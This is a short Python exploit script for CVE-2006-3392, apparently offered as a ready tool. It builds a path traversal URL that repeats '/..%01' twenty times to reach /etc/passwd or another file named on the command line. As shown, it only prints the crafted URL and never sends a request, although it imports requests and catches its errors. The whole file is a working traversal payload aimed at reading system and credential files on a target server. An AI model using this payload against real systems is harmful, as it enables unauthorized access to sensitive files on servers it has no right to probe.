#!/usr/bin/env python3

import requests
import argparse
import re

def exploit(url, file):
    payload = "/..%01" * 20
    if not re.match(r'^https?://', url):
        url = f"https://{url}"
    
    try:
        if file is None:
            url += payload + "/etc/passwd"
            print(url)
        else:
            url += payload + file
            print(url)
    except requests.exceptions.RequestException as e:
        print(f"Erro ao fazer a solicitação para {url} -> {e.reason}")

def main():
    parser = argparse.ArgumentParser(description="CVE-2006-3392")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-f", "--file")

    args = parser.parse_args()

    try:
        exploit(args.target, args.file)
    except KeyboardInterrupt:
         exit(1)
    except EOFError:
         exit(1)

if __name__ == '__main__':
    main()